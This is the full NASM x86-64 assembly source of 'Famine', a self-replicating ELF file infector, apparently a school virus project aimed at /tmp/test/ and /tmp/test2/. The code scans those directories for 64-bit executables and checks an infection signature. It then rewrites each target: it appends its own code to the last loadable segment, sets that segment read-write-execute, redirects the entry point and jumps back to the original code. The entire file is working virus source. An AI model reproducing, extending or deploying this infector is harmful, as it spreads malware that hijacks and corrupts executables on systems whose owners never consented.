	[BITS 64]

	%define SYS_WRITE 	1
	%define SYS_OPEN 	2
	%define SYS_CLOSE 	3
	%define SYS_LSEEK 	8
	%define SYS_MMAP 	9
	%define SYS_MUNMAP 	11
	%define SYS_UNLINK	87
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text

famine64_func:
	push	rax
	push 	rdi
	sub 	rsp, 8

	lea 	rdi, [rel dir_one]
	call 	find_files
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp 	famine64_end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push 	rax
	push 	rbx
	push 	rdx
	push 	rdi
	push 	rsi
	sub 	rsp, 1040	; char *dirpath, int fd   , int ret   , char b[1024]
						; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]

	xor 	eax, eax
	mov 	QWORD [rsp], rdi 		; store dir_path
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, 0, 0)                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rdx, 0
	mov 	rsi, 0
	mov 	rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			 	; test if < 0
	jl	 	find_files_end
	mov 	DWORD [rsp + 8], eax  	; store directory fd
loop_file:
	xor 	eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax 	 			; test if <= 0
	jle 	loop_end
	mov 	DWORD [rsp + 12], eax  	; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	rax, rax
	xor 	rbx, rbx							; RBX will be the offset of each struct dirent64
	jmp 	check_file_type
next_file:
	;; Next struct linux_dirent64*
	movsx	eax, WORD [rsp + 16 + rbx + 16] 	; 16 is the offset of *dirp->d_reclen
	add 	ebx, eax
	cmp 	DWORD [rsp + 12], ebx
	jle  	loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	cmp 	BYTE [rsp + 16 + rbx + 18], 8 		; 18 is the offset of *dirp->d_type
	jne 	next_file 	 						; Check if regular file
	mov 	rdi, QWORD [rsp]
	lea 	rsi, [rsp + 16 + rbx + 19]			; 19 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp 	next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	mov 	rax, SYS_CLOSE
	syscall
find_files_end:
	add 	rsp, 1040
	pop 	rsi
	pop 	rdi
	pop 	rdx
	pop 	rbx
	pop 	rax
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push 	rax
	push 	rcx
	push 	rdx
	push 	rdi
	push 	rsi
	push 	r8
	push 	r9
	push 	r10
	push 	r11
	sub 	rsp, 1024 	 	; char[1024]
 	 	 	 				; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ecx, ecx 	 	; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl 	 		; test directory end of string
	je  	copy_file
copy_dir_bytes:
	mov 	BYTE [rsp + rcx], dl
	inc 	rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne 	copy_dir_bytes
copy_file:
	add 	rsp, rcx
	xor 	eax, eax 	 	; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je  	open_file
copy_file_bytes:	
	mov 	BYTE [rsp + rax], dl
	inc 	rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne 	copy_file_bytes
open_file:
	mov 	BYTE [rsp + rax], 0 	; NULL byte the end of the string path
	sub 	rsp, rcx 	 	; Return to the start of the string path
	sub 	rsp, 20 	 	; int fd, size_t size, void *data
 	 	 	 				; [rsp] , [rsp + 4]  , [rsp + 12]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDWR|O_NONBLOCK, 0)                        ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edx, edx
	mov 	esi, 2
	lea 	rdi, [rsp + 20]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			; test if fd < 0
	jl  	get_dat_elf_end
	mov 	DWORD [rsp], eax	; store FD in [rsp]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax
	mov 	esi, 1
	mov 	edx, 2 	 		; LSEEK_END
	mov 	rax, SYS_LSEEK
	syscall
	cmp 	rax, 0x40 	 		; test if size of file <= sizeof(Elf64_Ehdr)
	mov 	r11, rax 	 		; store rax to r11 (see close_file label)
	jle  	close_file
	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edi, edi 	 	; NULL
	mov 	rsi, rax 	 	; size
	mov 	edx, 3 	 		; PROT_READ | PROT_WRITE
	mov 	r10d, 2 	 		; MAP_PRIVATE
	mov 	r8d, DWORD [rsp] 	; fd
	xor 	r9, r9 	 		; 0
	mov 	rax, SYS_MMAP
	syscall
	cmp 	rax, 0 	 		; test if == MAP_FAILED (-1)
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jl  	close_file
	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]
close_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	; int fd
	mov 	rax, SYS_CLOSE
	syscall
	cmp 	rax, 0 	 			; if we can't close the file, it will be a problem later
	jl  	munmap_file		 	; so we just end the function.
	cmp 	r11, 0x40 			; lseek, and mmap jump to close_file if a problem occurs
	jle  	munmap_file			; in that case we end the function.

	mov 	rdx, QWORD [rsp + 12]	; void *data
	mov 	rsi, QWORD [rsp + 4]	; int size
	lea 	rdi, [rsp + 20] 		; char *path
	call	infect_file
munmap_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rsi, QWORD [rsp + 4]	; int size
	mov 	rdi, QWORD [rsp + 12]	; void *data
	mov 	rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add 	rsp, 1044
	pop 	r11
	pop 	r10
	pop 	r9
	pop 	r8
	pop 	rsi
	pop 	rdi
	pop 	rdx
	pop 	rcx
	pop 	rax
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void infect_file(char *path, int size, char *data)            ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect_file:
	cmp 	BYTE [rdx], 0x7f 		; compare \x7fELF
	jne 	infect_file_end
	cmp 	BYTE [rdx + 1], 'E'
	jne 	infect_file_end
	cmp 	BYTE [rdx + 2], 'L'
	jne 	infect_file_end
	cmp 	BYTE [rdx + 3], 'F'
	jne 	infect_file_end
	cmp 	BYTE [rdx + 4], 2 		; ->e_ident[EI_CLASS] == ELFCLASS64
	jne 	infect_file_end
	cmp 	BYTE [rdx + 5], 0 		; ->e_ident[EI_DATA] != ELFDATANONE
	je  	infect_file_end
	cmp 	BYTE [rdx + 6], 1 		; ->e_ident[EI_VERSION] == EV_CURRENT
	jne 	infect_file_end
	movzx	eax, BYTE [rdx + 16] 	; ->e_type == ET_EXEC || ->e_type == ET_DYN
	sub 	eax, 2
	cmp 	al, 1
	ja  	infect_file_end

	push 	rax
	push 	rbx
	push 	rcx
	push 	rdx
	push 	rdi
	push 	rsi
	push 	r8
	push 	r9
	push 	r10
	push 	r11
	push 	r12
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Find the highest memory mapped PT_LOAD segment
	;;    R9 will store it.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    R8  : Program Header table start
	;;    RCX : Program Header table end
	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
	lea 	r8, [rdx + r8]			; Program Header table start
	xor 	rcx, rcx
	movzx	ecx, WORD [rdx + 56] 	; hdr->e_phnum
	xor 	r9, r9
	movzx	r9d, WORD [rdx + 54]	; hdr->e_phentsize
	imul	rcx, r9
	add 	rcx, r8 	   			; Program Header table end
highest_pt_load:
	mov 	r9, r8
next_segment:
	add 	r8w, WORD [rdx + 54]	; move to next Program Header segment
	cmp 	rcx, r8 	 			; end of Program Header segment ?
	jle  	find_section
get_segment:
	cmp 	DWORD [r8], 1 			; is it PT_LOAD segment ?
	jne 	next_segment
	mov 	r10, QWORD [r8 + 16]
	cmp 	QWORD [r9 + 16], r10	; compare the pt_load segments virtual address
	jl  	highest_pt_load
	jmp 	next_segment

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Find the last section of the last PT_LOAD segment.
	;;    R10 will store it.
	;;    RBX will store the section number
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    R8  : Section Header table start
	;;    RCX : Section Header table end
find_section:
	mov 	r8, QWORD [rdx + 40] 	; ->e_shoff (size: 8)
	lea 	r8, [rdx + r8]			; Section Header table start
	xor 	rcx, rcx
	movzx	ecx, WORD [rdx + 60] 	; hdr->e_shnum
	xor 	r10, r10
	movzx	r10d, WORD [rdx + 58]	; hdr->e_shentsize
	imul	rcx, r10
	add 	rcx, r8 	   			; Section Header table end
	mov 	rbx, 0
found_last_section:
	inc 	rbx
	mov 	r10, r8
next_section:
	add 	r8w, WORD [rdx + 58] 	; next Section Header
	cmp 	rcx, r8
	je  	check_signature
get_section:
	mov 	r12, QWORD [r10 + 16]
	cmp 	QWORD [r8 + 16], r12 	; compare sections address
	jg  	found_last_section
	jmp 	next_section

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3. Verify if the file is already infected
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RDX contains *data
	;;    R10 contains the last Section header
check_signature:	
	mov 	r8, QWORD [r10 + 24] 		; add isection->sh_offset
	add 	r8, QWORD [r10 + 32]		; add isection->sh_size
	sub 	r8, 16						; less the signature offset from the end
	cmp 	r8, rsi
	jge 	erase_file
	mov 	r8, QWORD [rdx + r8]
	cmp 	r8, QWORD [rel signature]
	je  	infect_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 4. Erase file from system tree before any changes !!!
	;;    int unlink(char *pathname)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RDI already contains *pathname.
erase_file:
	mov 	rax, SYS_UNLINK
	syscall
	cmp 	rax, 0
	jne  	infect_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Modify Sections offset higher than the last Section
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    R10 contains last Section header
	;;    RBX contains last Section header number
	mov 	r8, QWORD [rdx + 40]			; ->e_shoff (size: 8)
	lea 	r8, [rdx + r8]					; Section Header table start
	xor 	rcx, rcx
	movzx	ecx, WORD [rdx + 60] 			; hdr->e_shnum
	xor 	r11, r11
	movzx	r11d, WORD [rdx + 58]			; hdr->e_shentsize
	imul	rcx, r11
	add 	rcx, r8 	   					; Section Header table end
modify_section:	
	add 	r8w, WORD [rdx + 58] 			; next Section Header
	cmp 	rcx, r8
	jle 	modify_elf_header	 			; last section ?
	mov 	rax, QWORD [r8 + 24] 			; store section->sh_offset
	cmp 	QWORD [r10 + 24], rax			; last->offset > section->offset ?
	jg  	modify_section
	cmp 	r8, r10							; section == lastsection ?
	je  	modify_section
	add 	rax, QWORD [r10 + 32]			; add to section offset last section size
	add 	eax, DWORD [rel famine64_size]	; add our code size
	mov 	QWORD [r8 + 24], rax
	cmp 	DWORD [r8 + 40], ebx 			; section->sh_link > lastsection number ?
	jle 	modify_section
	add 	DWORD [r8 + 40], 1
	jmp 	modify_section

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 6. Modify the Elf Header
	;; 
	;;  a. Store old Entry Point ( R11 )
	;;  b. Modify the Entry Point
	;;  c. Modify Section Header Table offset
	;;  d. Increment Section Header number
	;;  e. Increment Section Header String Index
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RDX contains *data
	;;    R9  contains last PT_LOAD Segment header
	;;    R10 contains last Section header
	;;    R11 will contain original Entry Point
modify_elf_header:
	mov 	r11, QWORD [rdx + 24]			; a. original Entry Point
	;; Compute new entry point
	mov 	rax, QWORD [r9 + 16]			;      r9->p_vaddr
	sub 	rax, QWORD [r9 + 8]				;    - r9->p_offset
	add 	rax, QWORD [r10 + 24]			;    + r10->sh_offset
	add 	rax, QWORD [r10 + 32]			;    + r10->sh_size
	mov 	QWORD [rdx + 24], rax			; b. new Entry Point
	;; Compute for later the jump offset
	sub 	r11, rax
	;; Compute the new Section Header table offset
	mov 	rax, QWORD [r10 + 32]			;      r10->sh_size
	add 	eax, DWORD [rel famine64_size]	;    + our code size
	add 	QWORD [rdx + 40], rax			; c. + rdx->e_shoff
	add 	WORD [rdx + 60], 1				; d. rdx->e_shnum++ 
	add 	WORD [rdx + 62], 1				; e. rdx->e_shstrndx++
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Modify Infected Segment
	;;
	;;  a. permissions
	;;  b. memory size
	;;  c. file size
	;;  d. alignment (if needed)
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	;;    R9  contains last PT_LOAD Segment header
	xor 	ecx, ecx
	or  	ecx, 1					; segment R permission
	or  	ecx, 2					; segment W permission
	or  	ecx, 4					; segment X permission
	mov 	DWORD [r9 + 4], ecx
	mov 	ecx, DWORD [rel famine64_size]
	add 	QWORD [r9 + 40], rcx 	; segment memory size
	mov 	rcx, QWORD [r9 + 40]
	mov 	QWORD [r9 + 32], rcx 	; segment file size

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 9. Rewrite the file
	;; 
	;;    a. Re-create the file
	;;    b. Copy the original program until the infected segment offset.
	;;    c. Copy our program at the end of it,
	;;       minus the original program virtual address size.
	;;    d. Copy, in our program, the original virtual address size,
	;;       so we will jump to it later.
	;;    e. Copy the rest of the original program.
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RDI contains *file_path
	;;    RSI contains data size
	;;    RDX contains &data
	;;    R9  contains last PT_LOAD Segment header
	;;    R10 contains last Section header
	;;    R11 contains the jump offset value
rewrite:
	movzx	ecx, WORD [rdx + 58] 		; rdx->e_shentsize for the new section
	add 	rcx, 44
	sub 	rsp, rcx
	;; int fd, char *data, size_t size, size_t entry, size_t offset, void *last_segment, void *last_section, Elf64_Shdr section
	;; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20] , [rsp + 28]   , [rsp + 36]        , [rsp + 44]        , [rsp + 52]

	mov 	DWORD [rsp], 0x0 			; clean [rsp] to store fd
	mov 	QWORD [rsp + 4], rdx 		; store the address of the file data
	mov 	QWORD [rsp + 12], rsi  		; store the file size
	mov 	QWORD [rsp + 20], r11 		; store the new jump offset
	mov 	rax, QWORD [r10 + 24] 		;       r10->sh_offset
	mov 	QWORD [rsp + 28], rax		; store offset
	mov 	QWORD [rsp + 36], r9		; store last pt_load segment offset
	mov 	QWORD [rsp + 44], r10		; store last section offset
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; a. int	sys_open(file_path, O_WRONLY | O_CREAT, 0755)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edx, 493			; 0755
	mov 	esi, 65				; O_WRONLY | O_CREAT
	lea 	rdi, [rdi]			; file path address
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 	 		; test if < 0
	jl	 	write_end
	mov 	DWORD [rsp], eax 	; store file fd

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; b. int	sys_write(fd, data, IS offset)
	;;    - Write from file[0] to file[injection] -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax 		  		; file fd
	mov 	rsi, QWORD [rsp + 4] 	; pointer of program data
	mov 	rdx, QWORD [rsp + 28] 	; offset until our injection
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; c. int	sys_write(fd, data, IS offset)
	;;    - Write '\0' of last section size -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	r12, QWORD [r10 + 32] 	; r10->sh_size
write_byte_zero:
	mov 	edi, DWORD [rsp] 	 	; file fd
	lea 	rsi, [rel zero]			; "\0"
	mov 	rdx, 1
	mov 	rax, SYS_WRITE
	syscall
	dec 	r12
	cmp 	r12, 0
	jg  	write_byte_zero
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. int	sys_write(fd, data, IS offset)
	;;    - Write our code -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	 		; file fd
	lea 	rsi, [rel famine64_func] 	; famine64_func
	mov 	edx, [rel famine64_size]	; famine64_size
	sub 	rdx, 8 	 	 				; less the size of jump offset variable
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; e. int	sys_write(fd, data, IS offset)
	;;    - Write jump offset-
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 		; file fd
	lea 	rsi, [rsp + 20] 	 	; load the jump offset value
	mov 	rdx, 8 	 	 			; sizeof jump offset 
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end
write_sect:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; f. int	sys_write(fd, data, IS offset)
	;;    - Write until our new section offset
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp]				; file fd
	mov 	rsi, QWORD [rsp + 4]			; &data
	add 	rsi, QWORD [rsp + 28] 			; &data + offset
	mov 	rax, QWORD [rsp + 4]			; &data
	movzx 	edx, WORD [rax + 58]			; data->e_shentsize
	add 	rdx, QWORD [rsp + 44]			; + infected section address
	sub 	rdx, QWORD [rsp + 4]			; - data address = offset of new section
	sub 	rdx, [rsp + 28]
	add 	QWORD [rsp + 28], rdx			; store new offset
	mov 	rax, SYS_WRITE
	syscall

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; g. int	sys_write(fd, data, IS offset)
	;;    - Write new section -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	DWORD [rsp + 52], 0		 	; sh_name
	mov 	DWORD [rsp + 56], 1		 	; sh_type      = SHT_PROGBITS
	mov 	QWORD [rsp + 60], 0x6		; sh_flags
	mov 	rax, [rsp + 4]				; load &data
	add 	rax, 24						; ->e_entry
	mov 	rax, [rax]
	mov 	QWORD [rsp + 68], rax		; sh_addr      = r9->p_vaddr - r9->p_offset + r10->sh_offset + r10->sh_size;
	mov 	rax, QWORD [rsp + 44]		; load last section offset
	mov 	rbx, QWORD [rax + 24]
	add 	rbx, QWORD [rax + 32]
	mov 	QWORD [rsp + 76], rbx		; sh_offset    = r9->sh_offset + r9->sh_size
	mov 	eax, DWORD [rel famine64_size]
	mov 	QWORD [rsp + 84], rax		; sh_size      = famine64_size
	mov 	DWORD [rsp + 92], 0			; sh_link      = 0
	mov 	DWORD [rsp + 96], 0			; sh_info      = 0
	mov 	QWORD [rsp + 100], 16		; sh_addralign = 0x10
	mov 	QWORD [rsp + 108], 0		; sh_entsize   = 0

	mov 	edi, DWORD [rsp]			; file fd
	lea 	rsi, [rsp + 52]				; Elf64_Shdr *
	mov 	rax, QWORD [rsp + 4]
	movzx 	edx, WORD [rax + 58]		; ->e_shentsize
	mov 	rax, SYS_WRITE
	syscall

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; h. int	sys_write(fd, data, IS offset)
	;;    Write from file[last section] to the end.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp]				; file fd
	mov 	rsi, QWORD [rsp + 4]			; &data
	add 	rsi, QWORD [rsp + 28]
	mov 	rdx, QWORD [rsp + 12]			; file size
	sub 	rdx, QWORD [rsp + 28]			; less offset of what we already wrote
	dec 	rdx
	mov 	rax, SYS_WRITE
	syscall

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 10. Close file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
clean_write_end:
	mov 	edi, DWORD [rsp]
	mov 	rax, SYS_CLOSE
	syscall

write_end:	
	mov 	rcx, [rsp + 4]
	movzx	ecx, WORD [rcx + 58]
	add 	rcx, 44
	add 	rsp, rcx
infect_file_end:
	pop 	r12
	pop 	r11
	pop 	r10
	pop 	r9
	pop 	r8
	pop 	rsi
	pop 	rdi
	pop 	rdx
	pop 	rcx
	pop 	rbx
	pop 	rax
	ret
	
famine64_end:
	cmp 	QWORD [rel jump_offset], 0x0 	; No jump address if the executable is the first
	je  	no_jump
	lea 	rax, [rel famine64_func]
	add 	QWORD [rel jump_offset], rax
no_jump:
	add 	rsp, 8
	pop 	rdi
	pop 	rax

	cmp 	QWORD [rel jump_offset], 0x0 	; No jump address if the executable is the first
	je  	do_ret
	push 	QWORD [rel jump_offset]
do_ret:	
	ret
	
data:
	zero dq 0x00000000
	famine64_size dd end_of_file - famine64_func
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	signature dd 0x42CAFE42, 0x24EFAC24
	jump_offset dq 0x00000000
end_of_file:
